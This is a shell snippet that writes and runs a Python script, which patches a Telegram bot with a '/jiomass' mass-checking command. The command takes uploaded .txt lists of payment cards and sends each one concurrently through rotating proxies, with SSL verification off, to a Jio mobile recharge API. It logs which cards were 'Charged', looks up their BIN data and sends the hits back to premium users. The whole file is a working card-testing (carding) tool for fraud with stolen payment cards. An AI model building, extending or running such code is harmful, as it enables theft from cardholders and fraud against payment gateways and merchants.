cd /root/dxo && cat > add_jiomass.py << 'PYEOF'
import re, shutil, os, sys
from datetime import datetime

f = 'bot.py'
if not os.path.exists(f):
    print('❌ bot.py not found'); sys.exit(1)

shutil.copy(f, f + '.bak.' + datetime.now().strftime('%Y%m%d_%H%M%S'))
src = open(f).read()

if 'JIO_MASS_STATE' in src:
    print('⚠️  /jiomass already exists — skipping'); sys.exit(0)

m = re.search(r'^(JIO_API = .+)$', src, re.M)
if not m:
    print('❌ JIO_API line not found'); sys.exit(1)

code = '''

# ══════════════════════════════════════════════════════════════════════════════
#  ▸ JIO MASS HITTER — /jiomass number amount  (reply / send .txt with cards)
# ══════════════════════════════════════════════════════════════════════════════
JIO_MASS_STATE: dict = {}
JIO_ACTIVE: dict = {}
JIO_MASS_WORKERS = int(os.environ.get("JIO_MASS_WORKERS", "10"))


def _jio_pick_proxy(proxies):
    p = random.choice(proxies).strip()
    for prefix in ('http://', 'https://', 'socks4://', 'socks5://'):
        if p.startswith(prefix):
            p = p[len(prefix):]
            break
    if '@' in p:
        creds, hostport = p.rsplit('@', 1)
        if ':' in creds:
            user, pw = creds.split(':', 1)
            return f"{hostport}:{user}:{pw}"
        return hostport
    return p


async def _jio_hit_once(number, amount, card, proxy_param, timeout=90):
    url = JIO_API.rstrip("/")
    params = {"number": number, "amount": amount, "card": card, "proxy": proxy_param}
    t0 = time.time()
    conn = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=timeout)) as s:
            async with s.get(url, params=params) as r:
                try:
                    data = await r.json()
                except Exception:
                    data = {"_raw": await r.text()}
        return True, data, round(time.time() - t0, 2)
    except asyncio.TimeoutError:
        return False, {"error": "timeout"}, round(time.time() - t0, 2)
    except Exception as e:
        return False, {"error": str(e)[:100]}, round(time.time() - t0, 2)


def _jio_classify(data):
    if not isinstance(data, dict):
        return None, "ERROR", "Invalid response"
    _ok = data.get("ok")
    _stage = data.get("stage", "")
    _user_msg = (data.get("user_message") or "").strip()
    _error = (data.get("error") or "").strip()
    _payload = data.get("payload") or {}
    if _ok is True or (_payload and _payload.get("status") is True):
        return "Charged", "RECHARGE_SUCCESS", _user_msg or "Recharge successful"
    raw = (_user_msg or _error or "Unknown").lower()
    if "proxy" in raw and ("dead" in raw or "failed" in raw):
        return None, "PROXY_ERROR", _user_msg or "Proxy dead"
    if _stage == "ccdc_confirm" or "confirmation rejected" in raw or "rejected by gateway" in raw:
        return None, "CARD_DECLINED", "Card declined by gateway"
    if any(x in raw for x in ("decline", "insufficient", "invalid card", "expired", "do not honor")):
        return None, "CARD_DECLINED", (_user_msg or _error)[:120]
    if any(x in raw for x in ("number", "invalid number", "operator")):
        return None, "INVALID_NUMBER", (_user_msg or _error)[:120]
    return None, "FAILED", (_user_msg or _error or "Unknown")[:120]


@bot.on(events.NewMessage(pattern=r'^/jiomass(?:\\\\s+(.+))?$'))
async def jiomass_cmd(event):
    uid = event.sender_id
    if is_banned(uid):
        return
    if not is_premium(uid) and not is_admin(uid):
        await event.reply(pe("Premium required"), parse_mode='html')
        return
    body = (event.pattern_match.group(1) or "").strip()
    if event.reply_to_msg_id and body:
        parts = body.split()
        if len(parts) < 2:
            await event.reply(pe("Usage: /jiomass number amount"), parse_mode='html')
            return
        number, amount = parts[0].strip(), parts[1].strip()
        reply = await event.get_reply_message()
        if not reply.file or not (reply.file.name or '').endswith('.txt'):
            await event.reply(pe("Reply to a .txt file"), parse_mode='html')
            return
        import tempfile, uuid as _u
        td = os.path.join(tempfile.gettempdir(), "rxo_uploads")
        os.makedirs(td, exist_ok=True)
        fp = os.path.join(td, f"{_u.uuid4().hex}.txt")
        fp = await reply.download_media(file=fp)
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
        finally:
            try: os.remove(fp)
            except: pass
        cards = extract_cc(content)
        if not cards:
            await event.reply(pe("No valid cards"), parse_mode='html')
            return
        await _jiomass_start(uid, number, amount, cards, reply.file.name or 'cards.txt', event.message.id)
        return
    if body and not event.reply_to_msg_id:
        parts = body.split()
        if len(parts) < 2:
            await event.reply(pe("Usage: /jiomass number amount"), parse_mode='html')
            return
        number, amount = parts[0].strip(), parts[1].strip()
        if not number.isdigit() or len(number) < 10:
            await event.reply(pe("Invalid number"), parse_mode='html')
            return
        JIO_MASS_STATE[uid] = {'number': number, 'amount': amount, 'waiting_file': True}
        await event.reply(pe(f"Jio Mass Ready\\nNumber: {number}\\nAmount: {amount}\\nNow send .txt with cards"), parse_mode='html')
        return
    await event.reply(pe("Jio Mass Usage:\\n/jiomass number amount\\nOR reply .txt + command"), parse_mode='html')


@bot.on(events.NewMessage(func=_is_txt_file))
async def jiomass_file_handler(event):
    uid = event.sender_id
    st = JIO_MASS_STATE.get(uid)
    if not st or not st.get('waiting_file'):
        return
    file_name = event.file.name or 'cards.txt'
    import tempfile, uuid as _u
    td = os.path.join(tempfile.gettempdir(), "rxo_uploads")
    os.makedirs(td, exist_ok=True)
    fp = os.path.join(td, f"{_u.uuid4().hex}.txt")
    fp = await event.message.download_media(file=fp)
    try:
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
    finally:
        try: os.remove(fp)
        except: pass
    cards = extract_cc(content)
    if not cards:
        await event.reply(pe("No valid cards"), parse_mode='html')
        return
    number = st['number']; amount = st['amount']
    JIO_MASS_STATE.pop(uid, None)
    await _jiomass_start(uid, number, amount, cards, file_name, event.message.id)


async def _jiomass_start(uid, number, amount, cards, file_name, reply_to_id):
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not proxies:
        await bot.send_message(uid, pe("No proxies. /setproxy ip:port"), parse_mode='html')
        return
    text = pe(f"Jio Mass Started\\nTotal: {len(cards)}\\nNumber: {number}\\nAmount: {amount}\\nWaiting...")
    msg = await raw_send(uid, text, rows_stop())
    msg_id = msg if isinstance(msg, int) else (msg.id if msg else None)
    if not msg_id:
        return
    JIO_ACTIVE[uid] = {
        'msg_id': msg_id, 'stop': False, 'paused': False,
        'started_at': time.time(),
        'charged': 0, 'declined': 0, 'error': 0,
        'charged_list': [], 'declined_list': [], 'error_list': [],
        'number': number, 'amount': amount,
    }
    asyncio.create_task(_jiomass_worker(uid, cards, proxies, file_name))


async def _jiomass_worker(uid, cards, proxies, file_name):
    st = JIO_ACTIVE.get(uid)
    if not st:
        return
    sem = asyncio.Semaphore(JIO_MASS_WORKERS)
    lock = asyncio.Lock()

    async def one(card):
        async with sem:
            if st['stop']:
                return
            while st.get('paused') and not st['stop']:
                await asyncio.sleep(1)
            if st['stop']:
                return
            proxy_param = _jio_pick_proxy(proxies)
            ok, data, elapsed = await _jio_hit_once(st['number'], st['amount'], card, proxy_param)
            hit_type, status_display, result_text = _jio_classify(data if ok else {})
            async with lock:
                if hit_type == "Charged":
                    st['charged'] += 1
                    st['charged_list'].append({'card': card, 'msg': result_text, 'time': elapsed})
                elif status_display == "CARD_DECLINED":
                    st['declined'] += 1
                    st['declined_list'].append({'card': card, 'msg': result_text, 'time': elapsed})
                else:
                    st['error'] += 1
                    st['error_list'].append({'card': card, 'msg': result_text, 'time': elapsed})
            if hit_type == "Charged":
                try:
                    bin_info = await get_bin_info(card.split('|')[0])
                except Exception:
                    bin_info = None
                try:
                    await send_realtime_hit(uid, {
                        'card': card, 'status': 'Charged', 'message': result_text,
                        'gateway': 'Jio Recharge', 'price': st['amount'],
                        'time': elapsed, 'bin_info': bin_info,
                    }, 'Charged', file_name)
                except Exception as e:
                    print(f"[JIOMASS hit] {e}")

    try:
        tasks = [asyncio.create_task(one(c)) for c in cards]
        async def upd():
            while not st['stop'] and any(not t.done() for t in tasks):
                await asyncio.sleep(3)
                done = st['charged'] + st['declined'] + st['error']
                total = len(cards)
                pct = int(100 * done / total) if total else 0
                filled = int(20 * done / total) if total else 0
                bar = '●' * filled + '○' * (20 - filled)
                txt = pe(
                    f"Jio Mass Running\\n"
                    f"Total: {total}\\n"
                    f"Done: {done}\\n"
                    f"Charged: {st['charged']}\\n"
                    f"Declined: {st['declined']}\\n"
                    f"Error: {st['error']}\\n"
                    f"{bar} {pct}%\\n"
                    f"{done}/{total}"
                )
                try:
                    await raw_edit(uid, st['msg_id'], txt, rows_stop())
                except Exception:
                    pass
        upt = asyncio.create_task(upd())
        await asyncio.gather(*tasks, return_exceptions=True)
        upt.cancel()
    finally:
        JIO_ACTIVE.pop(uid, None)
        JIO_MASS_STATE.pop(uid, None)
        done = st['charged'] + st['declined'] + st['error']
        elapsed = int(time.time() - st['started_at'])
        m, s = elapsed // 60, elapsed % 60
        summary = pe(
            f"Jio Mass Complete\\n"
            f"Total: {len(cards)}\\n"
            f"Charged: {st['charged']}\\n"
            f"Declined: {st['declined']}\\n"
            f"Error: {st['error']}\\n"
            f"Time: {m}m {s}s"
        )
        try:
            await bot.send_message(uid, summary, parse_mode='html')
        except: pass
        for label, arr, emoji in [('CHARGED', st['charged_list'], '💎'),
                                  ('DECLINED', st['declined_list'], '🚫'),
                                  ('ERROR', st['error_list'], '❌')]:
            if not arr:
                continue
            fn = f"jio_{label.lower()}_{int(time.time())}.txt"
            async with aiofiles.open(fn, 'w') as f:
                for r in arr:
                    await f.write(f"{r['card']} | {r['msg']} | {r['time']}s\\n")
            try:
                await bot.send_file(uid, fn, caption=pe(f"{label}: {len(arr)} {emoji}"), parse_mode='html')
            except: pass
            try: os.remove(fn)
            except: pass

'''

new_src = src[:m.end()] + code + src[m.end():]
open(f, 'w').write(new_src)
print('✅ /jiomass inserted into bot.py')
print('   Backup: ' + f + '.bak.*')
PYEOF
python3 add_jiomass.py
